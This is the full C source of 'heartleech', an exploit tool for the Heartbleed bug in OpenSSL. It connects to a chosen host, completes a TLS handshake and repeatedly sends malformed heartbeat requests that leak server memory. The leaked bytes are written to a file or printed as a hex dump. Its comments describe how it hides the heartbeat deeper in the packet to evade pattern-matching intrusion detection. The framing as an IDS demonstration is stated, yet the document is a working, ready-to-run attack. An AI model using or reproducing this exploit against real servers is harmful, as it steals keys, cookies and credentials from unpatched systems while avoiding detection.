/*
    
    HEARLEECH

    A program for exploiting Neel Mehta's "HeartBleed" bug. This program has
    the following features:
    
    IDS EVASION: the purpose of writing this program is to demonstrate the
    inadequacy of "pattern-match" intrusion detection system. The signatures
    released after heartbleed for Snort-like IDS trigger on the bytes "18 03"
    in the first two bytes of TCP payload. This program sticks those bytes
    deeper in the payload, demonstrating pattern-matching is a flawed approach
    to IDS. The correct approach is to analyze the SSL protocol. The
    open-source project Bro does protocol analysis, and can therefore detect
    this program, as do most commercial vendors.

    ENCRYPTED BLEEDS: This program completes the SSL handshake, so that the
    bled data is encrypted on the network. This also avoids angry log 
    messages complaining about truncated handshakes.

    REPEATED REQUESTS: This program can sit in an endless loop requesting
    hearbeats over and over again.

    IPV6: This program supports IPv6 as well as IPv4.

    NOTES ON ASYNC/MEM-BIO: Normal use of the OpenSSL library takes care of
    sockets communication for you. This program uses the library differently,
    handling TCP/IP sockets completely separate from SSL. It does this so
    that it can stick the heartbeat request after the data in the same packet
    for IDS evasion. I point this out because this is a good style for using
    OpenSSL for things that require asynchronous communication, where you
    can't have normal socket operations.
*/

/*
 * Legacy Windows stuff
 */
#define _CRT_SECURE_NO_WARNINGS 1
#if defined(WIN32)
#include <WinSock2.h>
#include <WS2tcpip.h>
#define snprintf _snprintf
#else
#define WSAGetLastError() (errno)
#endif
#if defined(_MSC_VER)
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")
#endif

/*
 * OpenSSL specific includes. We also define an OpenSSL internal
 * function that is normally not exposed in include files, so
 * that we can format our 'bleed' manually.
 */
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);

/*
 * Stand C includes
 */
#include <stdio.h>
#include <string.h>

/**
 * Arguments for the heartbleed callback function
 */
struct DumpArgs {
    FILE *fp;
    const char *filename;
    const char *hostname;
    unsigned loop_count;
    unsigned ip_ver;
    unsigned port;
};


/****************************************************************************
 * This is the "callback" that receives the hearbeat data. Since 
 * hearbeat is a control function and not part of the normal data stream
 * it can't be read normally. Instead, we have to install a hook within
 * the OpenSSL core to intercept them.
 ****************************************************************************/
void 
dump_bytes(int write_p, int version, int content_type,
            const void *vbuf, size_t len, SSL *ssl, 
            void *arg)
{
    struct DumpArgs *dumpargs = (struct DumpArgs*)arg;
    const unsigned char *buf = (const unsigned char *)vbuf;

    /*
     * Ignore anything that isn't a "hearbeat". This function hooks
     * every OpenSSL-internal message, but we only care about
     * the hearbeats.
     */
    switch (content_type) {
    case SSL3_RT_CHANGE_CIPHER_SPEC: /* 20 */
    case SSL3_RT_HANDSHAKE: /* 22 */
    case SSL3_RT_APPLICATION_DATA: /* 23 */
        return;
    case SSL3_RT_ALERT: /* 21 */
        printf("[-] ALERT\n");
        return;
    case TLS1_RT_HEARTBEAT:
        break; /* handle below */
    default:
        fprintf(stderr, "[-] msg_callback:%u: unknown type seen\n", 
                                                            content_type);
        return;
    }

    /*
     * Inform user that we got some bleeding data
     */
    printf("[+] %5u-bytes bleed received\n", (unsigned)len);

    /*
     * Dump binary to a file
     */
    if (dumpargs->fp) {
        int x = fwrite(buf, 1, len, dumpargs->fp);
        if (x != len) {
            perror(dumpargs->filename);
        }
    } else {
        size_t i;
    
        /* no file, so print hex dump instead */
        for (i=0; i<len; i += 16) {
            size_t j;

            printf("%04x ", i);
            for (j=i; j<len && j<i+16; j++) {
                printf("%02x ", buf[j]);
            }
            for ( ; j<i+16; j++)
                printf("   ");

            for (j=i; j<len && j<i+16; j++) {
                if (isprint(buf[j]) && !isspace(buf[j]))
                    printf("%c", buf[j]);
                else
                    printf(".");
            }
            printf("\n");
        }
    }
}


/****************************************************************************
 * Wrapper function for printing addresses, since the standard
 * "inet_ntop()" function doesn't process both addresses equally
 ****************************************************************************/
static const char *
my_inet_ntop(int family, struct sockaddr *sa, char *dst, size_t sizeof_dst)
{
    switch (family) {
    case AF_INET:
        inet_ntop(AF_INET, &(((struct sockaddr_in *)sa)->sin_addr),
                dst, sizeof_dst);
        break;
    case AF_INET6:
        inet_ntop(AF_INET6, &(((struct sockaddr_in6 *)sa)->sin6_addr),
                dst, sizeof_dst);
        break;
    default:
        dst[0] = '\0';
    }

    return dst;
}


/****************************************************************************
 * This is the main threat that creates a TCP connection, negotiates
 * SSL, and then starts sending queries at the server.
 ****************************************************************************/
void
ssl_thread(const char *hostname, struct DumpArgs *args)
{
    int x;
    struct addrinfo *addr;
    int fd;
    SSL_CTX* ctx;
    SSL* ssl;
    BIO* rbio;
    BIO* wbio;
    size_t len;
    char buf[16384];
    char address[64];
    char *http_request;
    unsigned want_count = 0;
    size_t total_bytes = 0;
    char port[6];
    
    /*
     * Format the HTTP request. We need to stick the "Host:" header in
     * the correct place in the header
     */
    {
        static const char *prototype = 
                "GET / HTTP/1.1\r\n"
                "Host: \r\n"
                "User-agent: test/1.0\r\n"
                "Connection: keep-alive\r\n"
                "\r\n";
        size_t prefix;
        http_request = (char*)malloc(strlen(prototype)+strlen(hostname)+1);
        memcpy(http_request, prototype, strlen(prototype)+1);
        prefix = strstr(prototype, "Host: ") - prototype + 6;
        memcpy(http_request + prefix, hostname, strlen(hostname));
        memcpy( http_request + prefix + strlen(hostname), 
                prototype + prefix, 
                strlen(prototype+prefix) + 1);
    }

    
    
    /*
     * Do the DNS lookup. A hostname may have multiple IP addresses, so we
     * print them all for debugging purposes. Normally, we'll just pick
     * the first address to use, but we allow the user to optionally
     * select the first IPv4 or IPv6 address with the -v option.
     */
    snprintf(port, sizeof(port), "%u", args->port);
    fprintf(stderr, "[ ] resolving \"%s\"\n", hostname);
    x =  getaddrinfo(hostname, "443", 0, &addr);
    if (x != 0) {
        fprintf(stderr, "%s: DNS lookup failed\n", hostname);
        return;
    } else {
        struct addrinfo *a;
        for (a=addr; a; a = a->ai_next) {
            my_inet_ntop(a->ai_family, a->ai_addr, address, sizeof(address));
            fprintf(stderr, "[+]  %s\n", address);
        }
        printf("\n");
    }
    while (addr && args->ip_ver == 4 && addr->ai_family != AF_INET)
        addr = addr->ai_next;
    while (addr && args->ip_ver == 6 && addr->ai_family != AF_INET6)
        addr = addr->ai_next;
    if (addr == NULL) {
        fprintf(stderr, "IPv%u address not found\n", args->ip_ver);
        return;
    }
    my_inet_ntop(addr->ai_family, addr->ai_addr, address, sizeof(address));

    
    
    /*
     * Create a normal TCP socket
     */
    fd = socket(addr->ai_family, SOCK_STREAM, 0);
    if (fd < 0) {
        fprintf(stderr, "%s:%u: could not create socket\n", 
                                            hostname, addr->ai_family);
        return;
    }

    
    
    /*
     * Do a normal TCP connect to the target IP address, sending a SYN and
     * so on
     */
    fprintf(stderr, "[ ] %s: connecting...\n", address);
    x = connect(fd, addr->ai_addr, addr->ai_addrlen);
    if (x != 0) {
        fprintf(stderr, "%s: failed to connect, err=%d\n", 
                                            address, WSAGetLastError());
        return;
    }
    fprintf(stderr, "[+] %s: connected\n", address);

    
    
    /* 
     * Initialize SSL structures. Specifically, we initialize them with
     * "memory" BIO instead of normal "socket" BIO, because we are handling
     * the socket communications ourselves, and are just using BIO to
     * encrypt outgoing buffers and decrypt incoming buffers.
     */
    ctx = SSL_CTX_new(SSLv23_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    ssl = SSL_new(ctx);
    rbio = BIO_new(BIO_s_mem());
    wbio = BIO_new(BIO_s_mem());
    SSL_set_bio(ssl, rbio, wbio);
    SSL_set_connect_state(ssl);
    SSL_set_msg_callback(ssl, dump_bytes);
    SSL_set_msg_callback_arg(ssl, (void*)args);

    
    
    /* 
     * SSL handshake (rerouting the encryptions). This is an ASYNCHROUNOUS
     * technique using our own sockets and "memory BIO". It's not the normal
     * use of the API that you'd expect. We have to do do the send()/recv()
     * ourselves on sockets, then pass then through to the SSL layer 
     */
    fprintf(stderr, "[ ] %s: SSL handshake started...\n", address);
    for (;;) {
        len = BIO_pending(wbio);
        if (len) {
            if (len > sizeof(buf))
                len = sizeof(buf);
            BIO_read(wbio, buf, len);
            x = send(fd, buf, len, 0);
            if (x <= 0) {
                fprintf(stderr, "%s: send fail\n", hostname);
                goto end;
            }
        }

        x = SSL_connect(ssl);
        if (x >= 0)
            break; /* success! */
        if (x == -1 && SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ) {
            char buf[16384];
            struct timeval tv;
            fd_set readset;

            FD_ZERO(&readset);
            FD_SET(fd, &readset);
            tv.tv_sec = 0;
            tv.tv_usec = 1000;
            x = select(fd+1, &readset, NULL, NULL, &tv);
            if (x > 0) {
                x = recv(fd, buf, sizeof(buf), 0);
                if (x > 0) {
                    if (x >= 2 && memcmp(buf, "\x18\x03", 2) == 0) {
                        fprintf(stderr, "[-] '18 03' PACKET HEADER, POSSIBLE IDS TRIGGER\n");
                    }
                    BIO_write(rbio, buf, x);
                }
            }
        } else {
            fprintf(stderr, "%s: SSL handshake failed: %d\n", 
                                        address, SSL_get_error(ssl, 0));
            goto end;
        }
    }
    fprintf(stderr, "[+] %s: SSL handshake complete [%s]\n", 
                                        address, SSL_get_cipher(ssl));

    
    
    /* 
     * Send the HTTP request (encrypte) and Heartbeat request. This causes
     * the hearbeat request to happen at the end of the packet instead of the
     * front, thus evading pattern-match IDS
     */
again:
    if (--args->loop_count == 0)
        goto end;
    ssl3_write_bytes(ssl, SSL3_RT_APPLICATION_DATA, 
                            http_request, strlen(http_request));
    ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\xff\xff", 3);

    /* 
     * Transmit both requests (data and heartbeat) in the same packet
     */
    fprintf(stderr, "[ ] transmitting requests\n");
    while ((len = BIO_pending(wbio)) != 0) {
        if (len > sizeof(buf))
            len = sizeof(buf);
        BIO_read(wbio, buf, len);
        x = send(fd, buf, len, 0);
        if (x <= 0) {
            fprintf(stderr, "%s: send fail\n", hostname);
            goto end;
        }
    }

    /*
     * Wait for the response. We are actually just waiting for the normal
     * HTTP-layer response, but during the wait, callbacks to the
     * "dump_bytes" function will happen.
     */
    fprintf(stderr, "[ ] waiting for response\n");
    for (;;) {
        char buf[65536];
        struct timeval tv;
        fd_set readset;

        /* Use 'select' to poll to see if there is data waiting for us
         * from the network */
        FD_ZERO(&readset);
        FD_SET(fd, &readset);
        tv.tv_sec = 0;
        tv.tv_usec = 1000;
        x = select(fd+1, &readset, NULL, NULL, &tv);
        if (x > 0) {
            x = recv(fd, buf, sizeof(buf), 0);
            if (x > 0) {
                total_bytes += x;
                BIO_write(rbio, buf, x);
            }
        } else if (x < 0) {
            fprintf(stderr, "[-] socket err=%d\n", WSAGetLastError());
            break;
        }

        /*
         * Use the SSL function to decrypt the data that was put into the
         * BIO memory buffers above in the sockets.recv()/BIO_write()
         * combination.
         */
        x = SSL_read(ssl, buf, sizeof(buf));
        if (x < 0 || SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ)
            ;
        else if (x < 0) {
            x = SSL_get_error(ssl, x);

            fprintf(stderr, "[-] SSL error received\n");
            ERR_print_errors_fp(stderr);
            break;
        } else if (x > 0) {
            fprintf(stderr, "[+] %d-bytes data received\n", x);
            if (memcmp(buf, "HTTP/1.", 7) == 0 && strchr(buf, '\n')) {
                size_t i;
                fprintf(stderr, "[+] ");
                for (i=0; i<(size_t)x && buf[i] != '\n'; i++) {
                    if (buf[i] == '\r')
                        continue;
                    if (isprint(buf[i])&0xFF)
                        fprintf(stderr, "%c", buf[i]&0xFF);
                    else
                        fprintf(stderr, ".");
                }
                fprintf(stderr, "\n");
                goto again;
            }
                
        }
    }

    /*
     * We've either reached our loop limit or the other side closed the
     * connection
     */
    fprintf(stderr, "done\n");
end:
    return;
}




/****************************************************************************
 ****************************************************************************/
int
main(int argc, char *argv[])
{
    int i;
    struct DumpArgs args;

    memset(&args, 0, sizeof(args));
    args.port = 443;

    if (argc <= 1 ) {
usage:
        printf("\n");
        printf("usage:\n heartleech -t<hostname> -f<filename> [-l<loops>] [-p<port>] [-v<IPver>]  ...\n");
        printf(" <hostname> is a DNS name or IP address of the target\n");
        printf(" <filename> is where the binary heartbleed information is stored\n");
        printf(" <loops> is the number of repeated attempts to grab the informaiton\n");
        printf(" <port> is the port number, defaulting to 443\n");
        printf(" <IPver> is the IP version (4 or 6)\n");
        return 1;
    }


    /*
     * One-time program startup stuff for legacy Windows.
     */
#if defined(WIN32)
    {WSADATA x; WSAStartup(0x101,&x);}
#endif


    /*
     * One-time program startup stuff for OpenSSL.
     */
    CRYPTO_malloc_init();
    SSL_library_init();
    SSL_load_error_strings();
    ERR_load_BIO_strings();
    OpenSSL_add_all_algorithms();


    /*
     * Parse the program options
     */
    for (i=1; i<argc; i++) {
        char c;
        const char *arg;

        /* All parameters start with the standard '-' */
        if (argv[i][0] != '-') {
            fprintf(stderr, "%s: unknown option\n", argv[i]);
            goto usage;
        
        }

        /* 
         * parameters can be either of two ways:
         * -twww.google.com
         * -t www.google.com
         */
        c = argv[i][1];
        if (argv[i][2] == '\0') {
            arg = argv[++i];
            if (i >= argc) {
                fprintf(stderr, "-%c: missing parameter\n", c);
                goto usage;
            }
        } else
            arg = argv[i] + 2;

        /*
         * Get the parameter
         */
        switch (c) {
        case 't':
            args.hostname = arg;
            break;
        case 'f':
            args.filename = arg;
            break;
        case 'l':
            args.loop_count = strtoul(arg, 0, 0);
            break;
        case 'p':
            args.port = strtoul(arg, 0, 0);
            if (args.port >= 65536) {
                fprintf(stderr, "%u: bad port number\n", args.port);
                goto usage;
            }
            break;
        case 'v':
            args.ip_ver = strtoul(arg, 0, 0);
            switch (args.ip_ver) {
            case 4:
            case 6:
                break;
            default:
                fprintf(stderr, "%u: unknown IP version (must be 4 or 6)\n",
                    args.ip_ver);
                goto usage;
            }
            break;
        default:
            fprintf(stderr, "-%c: unknown argument\n", c);
            goto usage;
        }
    }
    if (args.hostname == 0) {
        fprintf(stderr, "no target specified, use \"-t <hostname>\"\n");
        goto usage;
    }
    args.loop_count++;

    /*
     * Open the file if it exists
     */
    if (args.filename) {
        args.fp = fopen(args.filename, "wb");
        if (args.fp == NULL) {
            perror(args.filename);
            return -1;
        }
    }

    /*
     * Now run the thread
     */
    ssl_thread(args.hostname, &args);

    /*
     * Finished. We should do a more gracefull close, but I'm lazy
     */
    if (args.fp)
        fclose(args.fp);
    return 0;
}



